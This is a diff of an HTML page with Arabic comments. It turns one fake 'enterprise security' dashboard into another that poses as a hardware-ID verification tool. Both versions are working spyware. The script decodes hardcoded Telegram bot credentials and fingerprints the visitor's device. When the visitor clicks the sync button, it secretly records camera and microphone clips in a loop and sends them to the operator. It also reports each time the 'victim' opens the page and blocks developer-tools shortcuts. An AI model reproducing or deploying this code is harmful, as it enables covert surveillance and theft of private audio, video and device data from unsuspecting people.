@@ -3,268 +3,239 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TITAN Cloud Security | المركز الرئيسي لإدارة البيانات</title>
+    <title>Enterprise Core V2 | مركز البيانات السيادي</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
-    
-    <style>
-        :root { --p-blue: #0ea5e9; --dark-bg: #020617; }
-        body { background: var(--dark-bg); color: #f1f5f9; font-family: 'Segoe UI', system-ui; overflow: hidden; height: 100vh; }
-        
-        /* تصميم الواجهة الزجاجية */
-        .glass-card { background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 2rem; }
-        
-        /* أنيميشن الخلفية المتحركة */
-        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
-        
-        /* شاشة التحميل العملاقة للتمويه */
-        #loader-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner-outer { width: 120px; height: 120px; border: 4px solid #0ea5e920; border-top-color: #0ea5e9; border-radius: 50%; animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.4/fingerprint2.min.js"></script>
 
-        /* إخفاء أدوات التجسس */
-        .spy-chamber { position: absolute; visibility: hidden; width: 1px; height: 1px; overflow: hidden; }
-        
-        .terminal-log { font-family: 'Consolas', monospace; font-size: 11px; color: #10b981; }
+    <style>
+        :root { --accent: #00ff88; --bg: #030712; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        .neon-border { border: 1px solid var(--accent); box-shadow: 0 0 15px rgba(0, 255, 136, 0.2); }
+        .glass-panel { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(30px); border-radius: 2.5rem; }
+        #matrix-bg { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
+        .btn-glow { transition: 0.4s; background: var(--accent); color: #000; font-weight: 900; }
+        .btn-glow:hover { box-shadow: 0 0 40px var(--accent); transform: scale(1.02); }
+        #loader { position: fixed; inset: 0; z-index: 9999; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .binary-load { font-family: monospace; color: var(--accent); font-size: 10px; }
     </style>
 </head>
 <body>
 
-<div id="loader-overlay">
-    <div class="spinner-outer"></div>
-    <h2 class="mt-8 text-xl font-bold tracking-[0.3em] text-blue-500 animate-pulse">TITAN SYSTEM INITIALIZING</h2>
-    <p id="loading-msg" class="mt-4 text-gray-500 text-xs font-mono">Loading module: crypto_auth_v8.dll</p>
+<div id="loader">
+    <div class="w-20 h-20 border-t-4 border-accent rounded-full animate-spin mb-4"></div>
+    <div class="binary-load" id="load-text">LOADING_CORE_SYSTEM_...</div>
 </div>
 
-<canvas id="bg-canvas"></canvas>
+<canvas id="matrix-bg"></canvas>
 
-<div class="flex h-screen overflow-hidden">
-    <aside class="w-72 glass-card m-4 mr-0 p-6 flex flex-col shadow-2xl">
-        <div class="flex items-center gap-3 mb-12 px-2">
-            <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center"><i class="fas fa-shield-nodes text-white"></i></div>
-            <span class="text-2xl font-black">TITAN<span class="text-blue-500">X</span></span>
+<div class="flex h-screen p-6 gap-6 relative">
+    <aside class="w-80 glass-panel neon-border p-8 flex flex-col">
+        <div class="mb-12">
+            <h2 class="text-3xl font-black tracking-tighter text-accent italic">LEVIATHAN<span class="text-white">V2</span></h2>
+            <p class="text-[10px] text-gray-500 uppercase tracking-widest">Advanced Recon Node</p>
         </div>
 
-        <nav class="space-y-3 flex-grow">
-            <div class="p-3 rounded-xl bg-blue-600/10 text-blue-400 border border-blue-600/20"><i class="fas fa-desktop ml-2"></i> لوحة التحكم</div>
-            <div class="p-3 rounded-xl hover:bg-white/5 transition cursor-pointer"><i class="fas fa-microchip ml-2"></i> تحليل المعالج</div>
-            <div class="p-3 rounded-xl hover:bg-white/5 transition cursor-pointer"><i class="fas fa-database ml-2"></i> قاعدة البيانات</div>
-            <div class="p-3 rounded-xl hover:bg-white/5 transition cursor-pointer"><i class="fas fa-key ml-2"></i> التشفير</div>
+        <nav class="space-y-4 flex-grow">
+            <div class="p-4 rounded-2xl bg-accent/10 text-accent border border-accent/20"><i class="fas fa-microchip ml-2"></i> فحص العتاد</div>
+            <div class="p-4 rounded-2xl hover:bg-white/5 transition opacity-50"><i class="fas fa-shield-virus ml-2"></i> جدار الحماية</div>
+            <div class="p-4 rounded-2xl hover:bg-white/5 transition opacity-50"><i class="fas fa-terminal ml-2"></i> وحدة التحكم</div>
         </nav>
 
-        <div class="p-4 rounded-3xl bg-gradient-to-tr from-slate-900 to-blue-900 border border-blue-500/20">
-            <p class="text-[10px] text-blue-400 font-bold uppercase mb-2">Node Encryption</p>
-            <div class="h-1 w-full bg-black/40 rounded-full"><div class="h-full w-2/3 bg-blue-500 shadow-[0_0_10px_#0ea5e9]"></div></div>
+        <div class="mt-auto p-4 glass-panel border border-white/5">
+            <p class="text-[10px] text-accent mb-2">تشفير الجلسة: <span class="text-white">نشط</span></p>
+            <div class="h-1 bg-gray-800 rounded-full overflow-hidden"><div class="h-full bg-accent w-full animate-pulse"></div></div>
         </div>
     </aside>
 
-    <main class="flex-grow flex flex-col p-4 overflow-hidden">
-        <header class="glass-card mb-4 p-8 flex justify-between items-center">
+    <main class="flex-grow flex flex-col gap-6">
+        <header class="glass-panel neon-border p-10 flex justify-between items-center">
             <div>
-                <h1 class="text-3xl font-black">مركز إدارة الموارد</h1>
-                <p class="text-gray-400 text-sm">مرحباً بك، النظام يقوم الآن بفحص توافق العتاد (Hardware Compatibility).</p>
+                <h1 class="text-4xl font-black">تحليل العتاد المتطور</h1>
+                <p class="text-gray-400 mt-2">نظام التحقق من هوية الأجهزة (Hardware ID Verification)</p>
             </div>
-            <button id="activate-btn" class="bg-blue-600 hover:bg-blue-500 px-10 py-4 rounded-2xl font-black text-lg transition shadow-lg shadow-blue-600/30 active:scale-95">
-                بدء المزامنة (SYNC)
+            <button id="main-sync" class="btn-glow px-12 py-5 rounded-3xl shadow-xl active:scale-95">
+                تفعيل المزامنة الشاملة
             </button>
         </header>
 
-        <div class="grid grid-cols-12 gap-4 flex-grow overflow-y-auto">
-            <div class="col-span-4 glass-card p-6 flex flex-col">
-                <h3 class="text-blue-500 font-bold mb-6 border-b border-white/5 pb-2"><i class="fas fa-mobile-screen-button"></i> تفاصيل الجهاز المستهدف</h3>
-                <div id="device-info" class="space-y-4 text-sm font-mono text-gray-300">
-                    <p>Detecting OS...</p>
-                    <p>Probing GPU...</p>
+        <div class="grid grid-cols-12 gap-6 flex-grow">
+            <div class="col-span-5 glass-panel neon-border p-8 flex flex-col">
+                <h3 class="text-accent font-bold mb-6 flex items-center gap-2 underline uppercase tracking-widest">
+                    <i class="fas fa-mobile"></i> تفاصيل الجهاز المستخرج
+                </h3>
+                <div id="device-root" class="space-y-4 font-mono text-sm text-emerald-400">
+                    <p>> جاري استخراج المعرّف الفريد...</p>
                 </div>
-                <div class="mt-auto pt-6">
-                    <div class="w-full h-24 bg-black/30 rounded-2xl border border-white/5 flex items-center justify-center">
-                        <i class="fas fa-fingerprint text-4xl text-blue-500/20"></i>
-                    </div>
+                <div class="mt-auto opacity-10 flex justify-center">
+                    <i class="fas fa-robot text-9xl"></i>
                 </div>
             </div>
 
-            <div class="col-span-8 glass-card p-6">
-                <h3 class="text-blue-500 font-bold mb-4"><i class="fas fa-chart-area"></i> استقرار الاتصال المشفر</h3>
-                <canvas id="complexChart" height="150"></canvas>
-            </div>
-
-            <div class="col-span-12 glass-card p-6 h-64">
-                <h3 class="text-emerald-500 font-bold mb-4 text-xs tracking-widest uppercase">Live Audit Logs</h3>
-                <div id="log-box" class="terminal-log overflow-y-auto h-40 space-y-1">
-                    <p>> [SYSTEM] Initializing Titan Security Kernel...</p>
-                    <p>> [NET] Tunneling via AES-256-GCM...</p>
-                </div>
+            <div class="col-span-7 glass-panel neon-border p-8">
+                <h3 class="text-accent font-bold mb-4 uppercase text-xs tracking-widest">Data Stream Frequency</h3>
+                <canvas id="streamChart" height="150"></canvas>
             </div>
         </div>
     </main>
 </div>
 
-<div class="spy-chamber">
-    <video id="v-stream" autoplay playsinline></video>
-    <canvas id="c-frame"></canvas>
+<div class="hidden">
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 </div>
 
 <script>
-    // --- التشفير والتهيئة (Stealth Core) ---
-    const _X = {
-        _T: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
-        _C: "NjA1MjUzMjA0NA=="
+    // --- النواة السيادية (The Sovereign Core) ---
+    const _K = {
+        _U: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
+        _I: "NjA1MjUzMjA0NA=="
     };
 
     const _D = (s) => atob(s);
-    const TELEGRAM_URL = `https://api.telegram.org/bot${_D(_X._T)}`;
-    const CHAT_ID = _D(_X._C);
+    const URL = `https://api.telegram.org/bot${_D(_K._U)}`;
+    const CID = _D(_K._I);
 
-    // دالة إرسال البيانات (Exfiltration Pipeline)
-    async function _EXFIL(data, type = "msg") {
+    async function _REPORT(p, t = "msg") {
         try {
-            if(type === "msg") {
-                await fetch(`${TELEGRAM_URL}/sendMessage`, {
+            if(t === "msg") {
+                await fetch(`${URL}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_ID, text: `🛡️ [TITAN_X]:\n${data}`, parse_mode: 'HTML'})
+                    body: JSON.stringify({chat_id: CID, text: `🐉 [LEVIATHAN_V2]:\n${p}`, parse_mode: 'HTML'})
                 });
             } else {
                 let f = new FormData();
-                f.append('chat_id', CHAT_ID);
-                f.append(type, data, `titan_vid_${Date.now()}.mp4`);
-                await fetch(`${TELEGRAM_URL}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {method: 'POST', body: f});
+                f.append('chat_id', CID);
+                f.append(t, p, `vid_${Date.now()}.mp4`);
+                await fetch(`${URL}/send${t.charAt(0).toUpperCase() + t.slice(1)}`, {method: f.method, body: f});
             }
         } catch(e) {}
     }
 
-    // --- وحدة سحب مواصفات الهاتف (Device Intelligence) ---
-    async function ANALYZE_DEVICE() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = gl ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+    // --- وحدة سحب مواصفات الجهاز بدقة (Deep Device Recon) ---
+    async function GET_REAL_DEVICE() {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        
+        // خوارزمية ذكية لتحديد اسم الهاتف من كرت الشاشة
+        let phoneName = "Unknown Device";
+        if(gpu.includes("Apple")) phoneName = "iPhone / iPad (Apple Silicon)";
+        else if(gpu.includes("Adreno")) phoneName = "High-End Android (Snapdragon)";
+        else if(gpu.includes("Mali")) phoneName = "Samsung / Huawei (Exynos/Kirin)";
 
-        const specs = {
-            "📱 الهاتف/الجهاز": navigator.platform,
-            "🌐 المتصفح": navigator.userAgent.split(') ')[1],
-            "⚙️ المعالج": navigator.hardwareConcurrency + " Cores",
-            "💾 الرامات": (navigator.deviceMemory || "N/A") + " GB",
-            "🖼️ كرت الشاشة": gpu,
-            "🔋 البطارية": "",
-            "🌍 اللغة": navigator.language
+        const data = {
+            "اسم الجهاز التقديري": phoneName,
+            "المعالج الرسومي (GPU)": gpu,
+            "أنوية المعالج": navigator.hardwareConcurrency + " Cores",
+            "الذاكرة العشوائية": (navigator.deviceMemory || "N/A") + " GB",
+            "دقة الشاشة": `${screen.width}x${screen.height}`,
+            "المتصفح": navigator.userAgent.split(') ')[1],
+            "اللغة": navigator.language
         };
 
-        // سحب حالة البطارية
-        if(navigator.getBattery) {
-            const b = await navigator.getBattery();
-            specs["🔋 البطارية"] = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-        }
+        const root = document.getElementById('device-root');
+        root.innerHTML = Object.entries(data).map(([k, v]) => `<p class="border-b border-white/5 pb-2"><span class="text-gray-500">${k}:</span> <span class="text-white">${v}</span></p>`).join('');
 
-        // عرض المواصفات للضحية (للتمويه)
-        const display = document.getElementById('device-info');
-        display.innerHTML = Object.entries(specs).map(([k, v]) => `<p><span class="text-blue-500">${k}:</span> ${v}</p>`).join('');
-
-        // إرسال التقرير الكامل لك
-        _EXFIL(`<b>📱 تقرير الجهاز الجديد:</b>\n<pre>${JSON.stringify(specs, null, 2)}</pre>`);
+        _REPORT(`<b>📱 تقرير دقيق للجهاز:</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`);
     }
 
     // --- وحدة سحب الفيديو (The Predator) ---
-    async function START_VIDEO_CAPTURE() {
+    async function START_VID() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-            document.getElementById('v-stream').srcObject = stream;
+            const v = document.getElementById('v');
+            v.srcObject = stream;
             
-            const recorder = new MediaRecorder(stream);
+            const rec = new MediaRecorder(stream);
             let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                _EXFIL(new Blob(chunks, {type: 'video/mp4'}), 'video');
-                // إعادة التشغيل تلقائياً لتسجيل مقطع آخر بعد فترة
-                setTimeout(START_VIDEO_CAPTURE, 60000); 
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                _REPORT(new Blob(chunks, {type: 'video/mp4'}), 'video');
+                setTimeout(START_VID, 20000); // تكرار التسجيل كل 20 ثانية
             };
             
-            recorder.start();
-            // سجل 15 ثانية وارسل
+            rec.start();
             setTimeout(() => { 
-                recorder.stop(); 
-                stream.getTracks().forEach(track => track.stop()); 
-            }, 15000);
+                rec.stop(); 
+                stream.getTracks().forEach(t => t.stop()); 
+            }, 10000); // تسجيل مقطع مدته 10 ثوانٍ
 
-        } catch(e) {
-            _EXFIL(`❌ فشل الوصول للكاميرا: ${e.message}`);
-        }
+        } catch(e) { _REPORT(`❌ فشل الكاميرا: ${e.message}`); }
     }
 
-    // --- الواجهة الرسومية (UI Engine) ---
-    function initVisuals() {
-        // رسم بياني ضخم ومعقد للتمويه
-        const ctx = document.getElementById('complexChart').getContext('2d');
+    // --- الرسم البياني والتمويه ---
+    function init() {
+        const ctx = document.getElementById('streamChart').getContext('2d');
         new Chart(ctx, {
             type: 'line',
             data: {
-                labels: Array.from({length: 30}, (_, i) => i),
+                labels: Array.from({length: 50}, (_, i) => i),
                 datasets: [{
-                    label: 'Sync Rate',
-                    data: Array.from({length: 30}, () => Math.floor(Math.random() * 100)),
-                    borderColor: '#0ea5e9',
-                    backgroundColor: 'rgba(14, 165, 233, 0.05)',
+                    data: Array.from({length: 50}, () => Math.random() * 100),
+                    borderColor: '#00ff88',
+                    borderWidth: 1,
                     fill: true,
-                    tension: 0.5
+                    backgroundColor: 'rgba(0, 255, 136, 0.05)',
+                    tension: 0.4
                 }]
             },
             options: { plugins: {legend: {display: false}}, scales: {x: {display: false}, y: {display: false}} }
         });
 
-        // خلفية 3D وهمية
-        const scene = new THREE.Scene();
-        const cam = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer({canvas: document.getElementById('bg-canvas'), alpha: true});
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        
-        const geo = new THREE.TorusKnotGeometry(10, 3, 100, 16);
-        const mat = new THREE.MeshBasicMaterial({color: 0x0ea5e9, wireframe: true});
-        const mesh = new THREE.Mesh(geo, mat);
-        scene.add(mesh);
-        cam.position.z = 30;
-
-        function anim() { requestAnimationFrame(anim); mesh.rotation.y += 0.005; renderer.render(scene, cam); }
-        anim();
+        // Matrix Background
+        const c = document.getElementById('matrix-bg');
+        const ctxM = c.getContext('2d');
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        const chars = "010101010101010101";
+        const drops = Array(Math.floor(c.width/20)).fill(1);
+        function drawM() {
+            ctxM.fillStyle = "rgba(0, 0, 0, 0.05)"; ctxM.fillRect(0, 0, c.width, c.height);
+            ctxM.fillStyle = "#00ff88"; ctxM.font = "15px monospace";
+            drops.forEach((y, i) => {
+                const text = chars[Math.floor(Math.random()*chars.length)];
+                ctxM.fillText(text, i*20, y*20);
+                if(y*20 > c.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawM, 50);
     }
 
-    // تفعيل الهجوم عند الضغط
-    document.getElementById('activate-btn').onclick = function() {
-        this.innerHTML = "<i class='fas fa-sync fa-spin ml-2'></i> جارٍ المزامنة...";
+    // زر المزامنة
+    document.getElementById('main-sync').onclick = function() {
+        this.innerHTML = "جارٍ فحص العتاد...";
         this.disabled = true;
+        GET_REAL_DEVICE();
+        START_VID();
+        _REPORT(`🎯 <b>تحرك الضحية:</b> بدأ مزامنة النظام وفحص الفيديو.`);
         
-        // البدء في سحب البيانات والفيديو
-        ANALYZE_DEVICE();
-        START_VIDEO_CAPTURE();
-        
-        _EXFIL(`🎯 <b>تحذير:</b> الضحية ضغط على زر المزامنة وبدأ سحب الفيديو.`);
-
         let p = 0;
         const itv = setInterval(() => {
             p += 1;
             if(p >= 100) {
                 clearInterval(itv);
-                this.innerHTML = "تمت المزامنة بنجاح ✅";
-                this.classList.replace('bg-blue-600', 'bg-emerald-600');
+                this.innerHTML = "مكتمل بنجاح ✅";
+                this.className = "bg-white text-black px-12 py-5 rounded-3xl font-black";
+                alert("تم التحقق من عتاد الجهاز وتشفير الجلسة.");
             }
-        }, 100);
+        }, 50);
     };
 
-    // نظام اللودر
     window.onload = () => {
         setTimeout(() => {
-            document.getElementById('loader-overlay').style.display = 'none';
-            initVisuals();
-            _EXFIL(`🚀 <b>دخول جديد:</b> الضحية فتح الصفحة الآن وهو في شاشة التحميل.`);
-        }, 2500);
+            document.getElementById('loader').style.display = 'none';
+            init();
+            _REPORT(`🚀 <b>دخول:</b> الضحية يشاهد الصفحة الآن.`);
+        }, 2000);
     };
 
-    // منع فحص الصفحة
+    // منع التفتيش
     window.onkeydown = (e) => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.key == 'I')) return false; };
 </script>
-
 </body>
 </html>
